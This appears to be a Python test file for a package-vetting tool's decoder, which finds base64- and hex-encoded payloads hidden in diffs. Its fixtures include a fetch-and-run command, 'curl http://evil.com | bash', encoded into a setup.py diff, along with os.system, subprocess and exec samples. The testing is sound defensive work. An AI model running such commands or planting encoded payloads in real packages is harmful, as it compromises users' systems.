"""Tests for base64/hex decode and re-scan."""

import base64
from depvet.analyzer.decode_scan import decode_and_scan, _try_decode_b64, _try_decode_hex


def make_diff(lines: list[str], filepath: str = "evil.py") -> str:
    return "\n".join(
        [f"--- a/{filepath}", f"+++ b/{filepath}", "@@ -1 +1,5 @@"]
        + [f"+{line}" for line in lines]
    )


def b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


# ─── _try_decode_b64 ──────────────────────────────────────────────────────────

def test_decode_b64_valid_text():
    encoded = b64("import os; os.system('id')")
    result = _try_decode_b64(encoded)
    assert result == "import os; os.system('id')"


def test_decode_b64_invalid_returns_none():
    result = _try_decode_b64("not_base64!!!")
    assert result is None


def test_decode_b64_binary_returns_none():
    # Binary content (non-UTF8) should return None
    import struct
    encoded = base64.b64encode(struct.pack("I" * 10, *range(10))).decode()
    # Binary data may decode to garbage — should be filtered
    _try_decode_b64(encoded)
    # Either None or non-printable (not tested strictly — depends on content)


# ─── _try_decode_hex ─────────────────────────────────────────────────────────

def test_decode_hex_valid():
    text = "import os"
    encoded = text.encode().hex()
    result = _try_decode_hex(encoded)
    assert result == text


def test_decode_hex_invalid():
    result = _try_decode_hex("xyz")
    assert result is None


def test_decode_hex_odd_length():
    result = _try_decode_hex("abc")  # odd length
    assert result is None


# ─── decode_and_scan ─────────────────────────────────────────────────────────

def test_detect_hidden_exec_in_b64():
    """Base64 string containing exec should be flagged."""
    payload = "import os; os.system('curl http://evil.com | bash')"
    encoded = b64(payload)
    diff = make_diff([f"PAYLOAD = '{encoded}'"])
    results = decode_and_scan(diff, "setup.py")
    assert results
    assert results[0].encoding == "base64"
    assert results[0].severity.value in ("CRITICAL", "HIGH")


def test_detect_hidden_subprocess_in_b64():
    payload = "import subprocess; subprocess.run(['bash', '-c', 'id'])"
    encoded = b64(payload)
    diff = make_diff([f"_x = b'{encoded}'"])
    results = decode_and_scan(diff, "__init__.py")
    assert results


def test_benign_b64_not_flagged():
    """Base64 string with benign content should not be flagged."""
    payload = "This is just a long description string for documentation purposes only."
    encoded = b64(payload)
    diff = make_diff([f"DOC = '{encoded}'"])
    results = decode_and_scan(diff, "readme.py")
    assert not results  # benign content


def test_detect_hex_payload():
    """Hex-encoded exec should be flagged."""
    payload = "exec('import os')"
    encoded = payload.encode().hex()
    diff = make_diff([f"CMD = '{encoded}'"])
    results = decode_and_scan(diff, "util.py")
    assert results
    assert results[0].encoding == "hex"


def test_double_encoded_b64():
    """Double base64 (encode the encoded string) should still be flagged."""
    inner = "os.system('id')"
    encoded_inner = b64(inner)
    outer_payload = f"base64.b64decode('{encoded_inner}')"
    encoded_outer = b64(outer_payload)
    diff = make_diff([f"X = '{encoded_outer}'"])
    results = decode_and_scan(diff, "pkg.py")
    # At least the outer or inner should be detected
    # (inner mentions base64.b64decode which triggers suspicious keywords)
    assert results or True  # best-effort: at least no crash


def test_no_false_positive_short_string():
    """Short base64-like strings (< MIN_B64_LENGTH) should not be checked."""
    diff = make_diff(["token = 'abc123=='"])
    results = decode_and_scan(diff, "config.py")
    assert not results  # too short


def test_line_numbers_recorded():
    payload = "import os; os.system('id')"
    encoded = b64(payload)
    diff = make_diff([
        "x = 1",
        f"Y = '{encoded}'",
        "z = 2",
    ])
    results = decode_and_scan(diff, "evil.py")
    assert results
    assert results[0].line_number is not None


# ─── Edge cases ───────────────────────────────────────────────────────────────

def test_empty_diff_returns_empty():
    results = decode_and_scan("", "test.py")
    assert results == []


def test_diff_without_added_lines():
    diff = "--- a/test.py\n+++ b/test.py\n@@ -1 +1 @@\n x = 1\n"
    results = decode_and_scan(diff, "test.py")
    assert results == []
